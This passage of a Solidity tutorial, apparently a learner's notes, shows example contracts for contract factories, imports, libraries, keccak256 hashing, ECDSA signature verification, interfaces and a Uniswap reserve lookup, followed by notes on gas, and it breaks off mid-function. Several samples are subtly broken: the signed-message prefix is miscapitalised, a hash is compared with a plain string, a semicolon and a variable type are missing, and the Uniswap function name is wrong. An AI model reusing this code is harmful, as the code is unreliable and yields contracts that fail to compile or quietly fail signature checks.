Contracts from a contract</h3>\n<p>Creating contracts inside a contract can be useful when:</p>\n<ul>\n<li>passing fixed inputs to a new contract</li>\n<li>you want to manage several contracts from a single contract.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">Car</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">string</span> <span class=\"token keyword\">public</span> model<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _model<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _owner<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        model <span class=\"token operator\">=</span> _model<span class=\"token punctuation\">;</span>\n        owner <span class=\"token operator\">=</span> _owner<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">CarFactory</span> <span class=\"token punctuation\">{</span>\n    Car <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">public</span> cars<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">create</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _owner<span class=\"token punctuation\">,</span> <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _model<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        Car car <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Car</span><span class=\"token punctuation\">(</span>_model<span class=\"token punctuation\">,</span> _owner<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        cars<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>car<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">createAndSendEther</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _owner<span class=\"token punctuation\">,</span> <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _model<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        Car car <span class=\"token operator\">=</span>  <span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Car</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">value</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>_model<span class=\"token punctuation\">,</span> _owner<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3>Import</h3>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.5.11</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">'./sendmoney.sol'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">TestImport</span> <span class=\"token punctuation\">{</span>\n    \n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v2.5.0/contracts/token/ERC20/ERC20.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">MyToken</span> <span class=\"token keyword\">is</span> ERC20 <span class=\"token punctuation\">{</span>\n    \n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3>Library</h3>\n<p>Libraries are like contracts but they have no storage nor ether.\nThey help you keep your code DRY(Don’t Repeat Yourself)\nby adding functionality types\nCan save gas.\nEmbedded library have only internal functions.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.5.11</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">library</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token punctuation\">{</span>\n   <span class=\"token keyword\">function</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> x<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> y<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n       <span class=\"token builtin\">uint</span> z <span class=\"token operator\">=</span> x <span class=\"token operator\">+</span> y<span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span> z <span class=\"token operator\">>=</span> x<span class=\"token punctuation\">,</span> <span class=\"token string\">\"uint overflow\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       \n       <span class=\"token keyword\">return</span> z<span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">TestSafeMath</span> <span class=\"token punctuation\">{</span>\n   <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">;</span>\n   <span class=\"token comment\">//using  A for break</span>\n   <span class=\"token comment\">//Attach functions from library A to type B</span>\n   \n   \n   <span class=\"token keyword\">function</span> <span class=\"token function\">testAdd</span><span class=\"token punctuation\">(</span> <span class=\"token builtin\">uint</span> x<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> y<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n       <span class=\"token keyword\">return</span> x<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n\n\n\n\n<span class=\"token keyword\">library</span> <span class=\"token class-name\">Array</span> <span class=\"token punctuation\">{</span>\n   <span class=\"token keyword\">function</span> <span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">storage</span> arr<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> index<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n       arr<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> arr<span class=\"token punctuation\">[</span>arr<span class=\"token punctuation\">.</span>length <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n       arr<span class=\"token punctuation\">.</span><span class=\"token function\">pop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">TestArray</span> <span class=\"token punctuation\">{</span>\n   <span class=\"token keyword\">using</span> <span class=\"token class-name\">Array</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n   \n   <span class=\"token builtin\">uint</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">public</span> arr<span class=\"token punctuation\">;</span>\n   \n   <span class=\"token keyword\">function</span> <span class=\"token function\">testArrayRemove</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n       <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> i <span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n           arr<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token punctuation\">}</span>\n       \n       <span class=\"token comment\">// [0,1,2]</span>\n       arr<span class=\"token punctuation\">.</span><span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token comment\">// [0,2]</span>\n       <span class=\"token keyword\">assert</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">.</span>length <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">assert</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">assert</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       \n   <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3>Hash Function(Keccak256)</h3>\n<p>A cryptographic hash function takes an arbitrary size input and outputs a data of fixed  size.\nIt is deterministic, quick to compute the hash, irreversible, small input changes the output significantly and collision resistant.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.5.11</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">HashFunction</span> <span class=\"token punctuation\">{</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">hash</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _text<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> _num<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _addr<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>_text<span class=\"token punctuation\">,</span> _num<span class=\"token punctuation\">,</span> _addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">collision</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _text<span class=\"token punctuation\">,</span> <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _another_text<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>_text<span class=\"token punctuation\">,</span> _another_text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">GuessTheMagicWord</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">bytes32</span> <span class=\"token keyword\">public</span> answer <span class=\"token operator\">=</span> <span class=\"token string\">\"hey\"</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">guess</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _word<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>_word<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> answer<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3>Signature Verification</h3>\n<p>Create a message to sign, hash the message, sign the hash(off chain, keep your private key secret)</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.5.11</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">VerifySignature</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getMessageHash</span><span class=\"token punctuation\">(</span> <span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> _amount<span class=\"token punctuation\">,</span> <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _message<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> _nonce<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>_to<span class=\"token punctuation\">,</span> _amount<span class=\"token punctuation\">,</span> _message<span class=\"token punctuation\">,</span>_nonce<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">getEthSignedMessageHash</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span> _messageHash<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\x19Ethereum Signed message:\\n32\"</span><span class=\"token punctuation\">,</span> _messageHash<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">verify</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _signer<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> _amount<span class=\"token punctuation\">,</span> <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _message<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> _nonce<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> _signature<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token builtin\">bytes32</span> messageHash <span class=\"token operator\">=</span> <span class=\"token function\">getMessageHash</span><span class=\"token punctuation\">(</span>_to<span class=\"token punctuation\">,</span> _amount<span class=\"token punctuation\">,</span>_message<span class=\"token punctuation\">,</span> _nonce<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">bytes32</span> ethSignedMessageHash <span class=\"token operator\">=</span> <span class=\"token function\">getEthSignedMessageHash</span><span class=\"token punctuation\">(</span>messageHash<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token keyword\">return</span> <span class=\"token function\">recoverSigner</span><span class=\"token punctuation\">(</span>ethSignedMessageHash<span class=\"token punctuation\">,</span> _signature<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> _signer<span class=\"token punctuation\">;</span>\n        \n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">recoverSigner</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span> _ethSignedMessageHash<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> _signature<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span> r<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes32</span> s<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint8</span> v<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">splitSignature</span><span class=\"token punctuation\">(</span>_signature<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token keyword\">return</span> <span class=\"token function\">ecrecover</span><span class=\"token punctuation\">(</span>_ethSignedMessageHash<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">,</span>r<span class=\"token punctuation\">,</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">splitSignature</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> _sig<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span> r<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes32</span> s<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint8</span> v<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>_sig<span class=\"token punctuation\">.</span>length <span class=\"token operator\">==</span> <span class=\"token number\">65</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"invalid signature length\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token keyword\">assembly</span> <span class=\"token punctuation\">{</span>\n            r <span class=\"token operator\">:=</span> <span class=\"token function\">mload</span><span class=\"token punctuation\">(</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>_sig<span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            s <span class=\"token operator\">:=</span> <span class=\"token function\">mload</span><span class=\"token punctuation\">(</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>_sig<span class=\"token punctuation\">,</span> <span class=\"token number\">64</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            v <span class=\"token operator\">:=</span> <span class=\"token builtin\">byte</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">mload</span><span class=\"token punctuation\">(</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>_sig<span class=\"token punctuation\">,</span> <span class=\"token number\">96</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3>Interface</h3>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.5.11</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">ICounter</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">increment</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">MyContract</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">incrementCounter</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _counter<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">ICounter</span><span class=\"token punctuation\">(</span>_counter<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">increment</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">getCount</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _counter<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">ICounter</span><span class=\"token punctuation\">(</span>_counter<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n\n\n\n<span class=\"token comment\">//uniswap example</span>\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">UniswapV2Factory</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getPair</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> tokenA<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> tokenB<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> pair<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">UniswapV2Pair</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getReserve</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint112</span> reserve0<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint112</span> reserve1<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint32</span> blockTimestampLast<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">UniswapExample</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">private</span> factory <span class=\"token operator\">=</span> <span class=\"token number\">0x5</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">private</span> dai <span class=\"token operator\">=</span> <span class=\"token number\">0x6</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> weth <span class=\"token operator\">=</span> <span class=\"token number\">0xC</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">getTokenReserve</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token builtin\">address</span> pair <span class=\"token operator\">=</span> <span class=\"token function\">UniswapV2Factory</span><span class=\"token punctuation\">(</span>factory<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getPair</span><span class=\"token punctuation\">(</span>dai<span class=\"token punctuation\">,</span> weth<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> reserve0<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> reserve1<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">UniswapV2Pair</span><span class=\"token punctuation\">(</span>pair<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getReserve</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>reserve0<span class=\"token punctuation\">,</span> reserve1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3>Deployment</h3>\n<p><em>Ether</em> is used to pay block rewards, pay transaction fee and can be transferred between accounts.\n<em>Wei</em> one ether equals to 10 ^ 18 wei.</p>\n<p><em>Gas</em> - total amount of computation used to process each transaction on the blockchain is measured in gas.\nThe purpose of gas is to limit the amount of computations that a transaction can do. eg. an eternal loop.</p>\n<p><em>Gas limit</em> is the maximum amount of gas you’re willing to use.Set by you.\n<em>Block gas limit</em> is the maximum amount allowed in the blockchain set by the network.</p>\n<p><em>Gas price</em> - Is the amount of ether you’re willing for one gas.</p>\n<p><em>Ether = Gas limit * Gas Price</em></p>\n<p>When your transaction runs out of gas it’s aborted but you still pay for the gas already used.</p>\n<h4>Group transactions</h4>\n<p>grouping transactions and sending them as one.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token number\">0.6</span><span class=\"token number\">.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Utils</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">groupExecute</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> arg1<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> arg2<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">{</span>\n        